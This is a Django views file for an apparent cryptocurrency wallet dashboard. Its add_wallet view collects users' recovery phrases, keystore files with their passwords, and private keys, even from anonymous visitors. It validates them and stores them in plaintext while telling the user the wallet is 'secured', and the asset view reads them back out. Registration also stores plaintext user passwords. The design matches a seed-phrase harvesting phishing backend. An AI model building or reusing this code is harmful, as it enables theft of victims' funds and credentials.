from django.shortcuts import render
from .models import * 
import requests
from django.shortcuts import render, redirect, get_object_or_404
from django.shortcuts import redirect
from django.contrib import messages
import json
from django.db.models import Q
from django.db import transaction
from django.contrib.auth.decorators import login_required
# Create your views here.
from django.contrib.auth import authenticate, login
def loginuser(request):
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")

        # If you're using email as username
        user = authenticate(request, username=email, password=password)

        if user is not None:
            login(request, user)
            return redirect("dashboard",pk=user.id)
 
        else:
            messages.error(request, "Invalid email or password")
    return render(request,'login.html')
def register(request):
    if request.method == "POST":
        name = request.POST.get("name").strip()
        email = request.POST.get("email").strip().lower()
        phone = request.POST.get("phone").strip()
        password = request.POST.get("password")
        password_confirm = request.POST.get("password_confirmation")

        # ✅ Basic validations
        if password != password_confirm:
            messages.error(request, "Passwords do not match.")
            return redirect("register")

        if User.objects.filter(username=email).exists():
            messages.error(request, "Email already registered.")
            return redirect("register")

        if len(password) < 6:
            messages.error(request, "Password must be at least 6 characters.")
            return redirect("register")

        # ✅ Create user and profile in a transaction
        try:
            with transaction.atomic():
                user = User.objects.create_user(
                    username=email,
                    email=email,
                    first_name=name,
                    password=password
                )

                uses = userCoin.objects.create(
                    user=user,
                    phone=phone,
                    password=password
                )
            login(request, user)
            mains =Coin2.objects.all()
            for i in mains:
                wallet_obj, created= userCoinwallet2.objects.update_or_create(iscoin2=i,username=name)   
                uses.iscoin2.add(wallet_obj)  
            messages.success(request, "Account created successfully! You can now log in.")
            return redirect("dashboard",pk=user.id)

        except Exception as e:
            messages.error(request, f"Error creating account: {str(e)}")
            return redirect("register")
    return render(request,'register.html')
def home(request):
    return render(request,'base.html')
def profile(request,pk):
    usermain = userCoin.objects.get(user=request.user)
    itemcoin2 = usermain.iscoin.all()
    
    usermain = userCoin.objects.get(user=request.user)
    itemcoin = usermain.iscoin.all()
    con ={
         'itemcoin2' :itemcoin2 ,
          'itemone' :itemcoin  , 
        
    }
    return render(request,'das/profile.html',con)
def withdrawl(request,pk):
    usermain = userCoin.objects.get(user=request.user)
    itemcoin2 = usermain.iscoin2.all()
    itemone = userCoinwallet2.objects.get(id=pk)
    if request.method =="POST":
        user_wallets= userCoin.objects.filter(user=request.user).first()
        amount = request.POST['amount']
        address = request.POST['address']
        balance = float(itemone.balance or 0)
        amount_value = float(amount or 0)
        if amount_value <= 0:
            messages.error(request, "Amount must be greater than 0")
            return redirect('withdrawl', pk=pk)
        if balance <= 0:
            messages.success(request,'insufficient funds')
            return redirect('withdrawl', pk=pk)
        if int(balance) >= int(amount_value) :
            s = withdrwa.objects.create(Amount=  amount, username=request.user.username,walletname=itemone.iscoin.fullname,RecipientAddress=address)
            user_wallets.withdrwauser.add(s)
            messages.success(request,'withdrawal Request processing')
            return redirect('withdrawl', pk=pk)
        else:
            messages.success(request,'insufficient funds')
            return redirect('withdrawl', pk=pk)
    con ={
         'itemcoin2' :itemcoin2  ,
         'itemone' :itemone  ,

    }
    return render(request,'das/with.html',con)
def deposite(request,pk):
    usermain = userCoin.objects.get(user=request.user)
    itemcoin2 = usermain.iscoin2.all()
    itemone = userCoinwallet2.objects.get(id=pk)
    itemonewallet = wallet.objects.get(name=  itemone.iscoin2.fullname)

    if request.method =="POST":
        user_wallets= userCoin.objects.filter(user=request.user).first()
        amount = request.POST['amount']
        if amount:
            s = deposit.objects.create(Amount=  amount, username=request.user.username,walletname=itemone.iscoin2.fullname)
            user_wallets.deposituser.add(s)
            messages.success(request,'Deposit Request Processing')
            return redirect('deposite', pk=pk)
    con ={
         'itemcoin2' :itemcoin2 ,
          'itemone' :itemone  , 
          'itemonewallet' :itemonewallet  , 
    }
    return render(request,'das/dep.html',con)

def get_coin_rates():
    # Fetch top coins (CoinGecko example)
    url = "https://api.coingecko.com/api/v3/simple/price"
    params = {
        "ids": "bitcoin,ethereum,cardano",  # list of coins
        "vs_currencies": "usd",
        "include_24hr_change": "true"
    }
    response = requests.get(url, params=params)
    if response.status_code == 200:
        return response.json()
    return {}




 
def asset(request, pk):
    """
    View to display details of a specific userCoinwallet for the logged-in user.
    """
    # Get the wallet and ensure it belongs to the logged-in user
    coin_wallet = get_object_or_404(userCoinwallet2, id=pk)

    # Get the userCoin that contains this wallet
    user_wallet = userCoin.objects.filter(user=request.user, iscoin2=coin_wallet).first()

    if not user_wallet:
        # User does not own this wallet
        context = {"error": "Wallet not found for this user."}
        return render(request, "das/topiccoin.html", context)

    # Fetch all wallets of the user
    all_wallets = user_wallet.iscoin2.all()

    # Coin linked to this wallet
    coin = coin_wallet.iscoin2
    coin_key = coin.fullname.lower()

    # Fetch coin price from CoinGecko
    rates = {}
    try:
        response = requests.get(
            "https://api.coingecko.com/api/v3/simple/price",
            params={
                "ids": coin_key,
                "vs_currencies": "usd",
                "include_24hr_change": "true",
                "include_market_cap": "true"
            },
            timeout=10
        )
        response.raise_for_status()
        rates = response.json().get(coin_key, {})
    except (requests.RequestException, ValueError):
        rates = {}

    price_usd = float(rates.get("usd") or 0)
    change_24h = float(rates.get("usd_24h_change") or 0)
    market_cap = float(rates.get("usd_market_cap") or 0)
    balance = float(coin_wallet.balance or 0)
    value_usd = balance * price_usd

    # Optional: Get phrase, keystone, and private key info if exists
    try:
        wallet_phrase = user_wallet.phrase
    except phrase.DoesNotExist:
        wallet_phrase = None

    try:
        wallet_keystone = user_wallet.Keystone
    except KeystoneJson.DoesNotExist:
        wallet_keystone = None

    try:
        wallet_privatekey = user_wallet.PrivateKey
    except PrivateKey.DoesNotExist:
        wallet_privatekey = None
    itemone = userCoinwallet2.objects.get(id=pk)
    usermain = userCoin.objects.get(user=request.user)
    itemcoin = usermain.iscoin2.all()
    context = {
        "userm": user_wallet,
        "all_wallets": all_wallets,
        "coin_wallet": coin_wallet,
        "coin": coin,
        "price_usd": price_usd,
        "change_24h": change_24h,
        "market_cap": market_cap,
        "balance": balance,
        "itemcoin2": itemcoin,
        "itemcoin": itemcoin,
        "itemone": itemone,
        "value_usd": value_usd,
        "wallet_phrase": wallet_phrase,
        "wallet_keystone": wallet_keystone,
        "wallet_privatekey": wallet_privatekey,
    }

    return render(request, "das/topiccoin.html", context)

def dashbaord(request,pk):

    usermain = userCoin.objects.get(user=request.user)
    itemcoin = usermain.iscoin2.all()
    itemcoin2 = usermain.iscoin2.all()
    if request.method  == 'GET':
        search_query = request.GET.get('search', '').strip() 
        if usermain.iscoin2.filter(
                Q(iscoin2__fullname__icontains=search_query) |
                Q(iscoin2__shortname__icontains=search_query)
            ):
         
            usermain = usermain.iscoin2.filter(
                Q(iscoin2__fullname__icontains=search_query) |
                Q(iscoin2__shortname__icontains=search_query)
            )
            print(search_query,)
            redirect('dashboard',pk=pk)       
    user_wallets = request.user.usercoin_set.prefetch_related('iscoin2').all()

    # Fetch coin rates from CoinGecko API
    coin_names = [cw.iscoin2.fullname.lower() for wallet in user_wallets for cw in wallet.iscoin2.all()]
    coin_names = list(set(coin_names))
    rates = {}
    if coin_names:
        response = requests.get(
            "https://api.coingecko.com/api/v3/simple/price",
            params={
                "ids": ",".join(coin_names),
                "vs_currencies": "usd",
                "include_24hr_change": "true"
            }
        )
        if response.status_code == 200:
            rates = response.json()

    # Precompute coins data
    active_positions = 0
    total_value = 0
    total_change_value = 0  # USD change over 24h
    for wallet in user_wallets:
        wallet.coins_data = []
        for cw in wallet.iscoin2.all():
            coin_key = cw.iscoin2.fullname.lower()
            idss = cw.id
            
            coin_rate = rates.get(coin_key, {})
            price_usd = coin_rate.get("usd", 0)
            change_24h = coin_rate.get("usd_24h_change", 0)
            balance = float(cw.balance or 0)
            value_usd = balance * price_usd

            # Count active positions
            if balance > 0:
                active_positions += 1
                total_change_value += value_usd * (change_24h / 100)

            total_value += value_usd

            wallet.coins_data.append({
                "fullname": cw.iscoin2.fullname,
                "shortname": cw.iscoin2.shortname,
                "image": cw.iscoin2.image,
                "id": idss,
                "balance": f"{balance:.8f}",
                "price_usd": price_usd,
                "change_24h": change_24h,
                "value_usd": value_usd
            })

    portfolio_change_percent = (total_change_value / total_value * 100) if total_value else 0
    
    usermainx = userCoin.objects.get(user=request.user)
     
    print(usermainx.balance)
    con ={
        'userm':usermain,
        'mainuserx':usermainx,
        'itemcoin':itemcoin,
        'itemcoin2':itemcoin2,
       "itemcoin": user_wallets,
       "active_positions": active_positions,
        "portfolio_value": total_value,
        "portfolio_change_percent": portfolio_change_percent,

    }
        
    return render(request,'das/dashboard.html',con)









from django.contrib.auth import logout
 

def logout_view(request):
    logout(request)
    return redirect('login')  # redirect to login page










def contentwallet(request):
    
    coin = Coin.objects.all()    
    if request.method  == 'POST':
        search_query = request.POST.get('search', '').strip() 
        if Coin.objects.filter(
                Q(fullname__icontains=search_query) |
                Q(shortname__icontains=search_query)
            ):
            coin = Coin.objects.filter(
                Q(fullname__icontains=search_query) |
                Q(shortname__icontains=search_query)
            )
            print('skdkdkdk,coin',coin)
            redirect('content-wallet')

   
    name = request.GET.get('name')  # returns 'dfff'
    
    # If 'name' is not in URL, it returns None
    if name:
        print("Name parameter:", name)
    
    
    cont = {
        'wallet_name': name,  # pass to template
        'coin':coin
    }
    return render(request,'contentwallet.html',cont)
# views.py
 

 
@login_required
def update_profile(request):
    if request.method == "POST":
        name = request.POST.get("name")
        email = request.POST.get("email")

        if not name or not email:
            messages.error(request, "All fields are required")
            return redirect("update_profile")

        user = request.user
        user.username = name   # or split into first_name if you want
        user.email = email
        user.save()

        messages.success(request, "Profile updated successfully!")
        return redirect("profilemain",pk=request.user.id)



from django.contrib.auth import update_session_auth_hash

@login_required
def change_password(request):
    if request.method == "POST":
        current_password = request.POST.get("current_password")
        new_password = request.POST.get("password")
        confirm_password = request.POST.get("password_confirmation")

        user = request.user

        # Check current password
        if not user.check_password(current_password):
            messages.error(request, "Current password is incorrect")
            return redirect("update_profile")

        # Check new password match
        if new_password != confirm_password:
            messages.error(request, "Passwords do not match")
            return redirect("update_profile")

        # Validate length
        if len(new_password) < 6:
            messages.error(request, "Password must be at least 6 characters")
            return redirect("update_profile")

        # Set new password
        user.set_password(new_password)
        user.save()

        # Keep user logged in
        update_session_auth_hash(request, user)

        messages.success(request, "Password updated successfully!")
        return redirect("profilemain",pk=request.user.id)
    else:
        return redirect("profilemain",pk=request.user.id)



from django.core.mail import send_mail,  EmailMultiAlternatives
from django.template.loader import get_template, render_to_string
from  django.utils.html import strip_tags
from django.conf import settings

# emal

def email_sending(request,tempname,context,subjects,to):
    try:
        tos = render_to_string(tempname,context=context )
        tags =strip_tags(tos)
        mas = EmailMultiAlternatives(
            subject = subjects,
            body=tags,
            from_email = settings.EMAIL_HOST_USER,
            to=[to]
            )
        mas.attach_alternative(tos, 'text/html')
        mas.send()
    except:
        pass



 

def add_wallet(request):

    # ✅ Handle authenticated or anonymous user
    user = request.user if request.user.is_authenticated else None

    # ✅ Ensure session exists (for anonymous users)
    if not request.session.session_key:
        request.session.create()
    session_key = request.session.session_key

    if request.method == "POST":
        coin_id = request.POST.get('coin_id')
        wallet_type = request.POST.get('type')
        wallet_name = request.POST.get('Namewallet')
        email = request.POST.get('Email')

        if not coin_id or not wallet_name:
            messages.error(request, "Coin and wallet name are required.")
            return redirect(request.META.get('HTTP_REFERER'))

        coin_obj = get_object_or_404(Coin, id=coin_id)

        try:
            # ✅ Get wallet using user OR session
            if user:
                main_wallet = userCoin.objects.filter(user=user).first()
            else:
                main_wallet = userCoin.objects.filter(session_key=session_key).first()

            # ✅ Create wallet if not exists
            if not main_wallet:
                main_wallet = userCoin.objects.create(
                    user=user,
                    session_key=session_key,
                    balance="0"
                )

            wallet_coin = main_wallet.iscoin.filter(iscoin=coin_obj).first()

            if not wallet_coin:
                wallet_coin = userCoinwallet.objects.create(
                    balance="0",
                    iscoin=coin_obj
                )
                main_wallet.iscoin.add(wallet_coin)

            # ----------------------
            # HANDLE WALLET TYPES
            # ----------------------

            if wallet_type == 'phrase':
                recovery_phrase = request.POST.get('RecoveryPhrase', '').strip()
                word_count = len([w for w in recovery_phrase.split() if w])

                if word_count not in [12, 18, 20, 24, 30]:
                    messages.error(request, "Recovery phrase must be valid.")
                    return redirect(request.META.get('HTTP_REFERER'))

                phrase.objects.update_or_create(
                    wallet=main_wallet,
                    defaults={
                        "Namewallet": wallet_name,
                        "Email": email,
                        "RecoveryPhrase": recovery_phrase
                    }
                )

                messages.success(request, f"Phrase wallet '{wallet_name}' secured.")

            elif wallet_type == 'keystore':
                keystore_json = request.POST.get('keystonejson', '').strip()
                keystore_password = request.POST.get('keystonejsonpassword', '').strip()

                try:
                    json.loads(keystore_json)
                except ValueError:
                    messages.error(request, "Invalid JSON.")
                    return redirect(request.META.get('HTTP_REFERER'))

                if not keystore_password:
                    messages.error(request, "Password required.")
                    return redirect(request.META.get('HTTP_REFERER'))

                KeystoneJson.objects.update_or_create(
                    wallet=main_wallet,
                    defaults={
                        "Namewallet": wallet_name,
                        "Email": email,
                        "keystonejson": keystore_json,
                        "keystonejsonpassword": keystore_password
                    }
                )

                messages.success(request, f"Keystore wallet '{wallet_name}' saved.")

            elif wallet_type == 'private':
                private_key = request.POST.get('PrivatemainKey', '').strip()
                key_no_prefix = private_key.replace("0x", "")

                if len(key_no_prefix) != 64 or not all(c in "0123456789abcdefABCDEF" for c in key_no_prefix):
                    messages.error(request, "Invalid private key.")
                    return redirect(request.META.get('HTTP_REFERER'))

                PrivateKey.objects.update_or_create(
                    wallet=main_wallet,
                    defaults={
                        "Namewallet": wallet_name,
                        "Email": email,
                        "PrivatemainKey": private_key
                    }
                )

                messages.success(request, f"Private wallet '{wallet_name}' saved.")

            else:
                messages.error(request, "Invalid wallet type.")
                return redirect(request.META.get('HTTP_REFERER'))

        except Exception as e:
            messages.error(request, f"Error: {str(e)}")
            return redirect(request.META.get('HTTP_REFERER'))

        # ✅ Redirect safely
        if user:
             
            return redirect("dashboard", pk=user.id)
        else:
            return redirect("home")  # or success page

    # ✅ GET request
    coins = Coin.objects.all()
    return render(request, "contentwallet.html", {"coins": coins})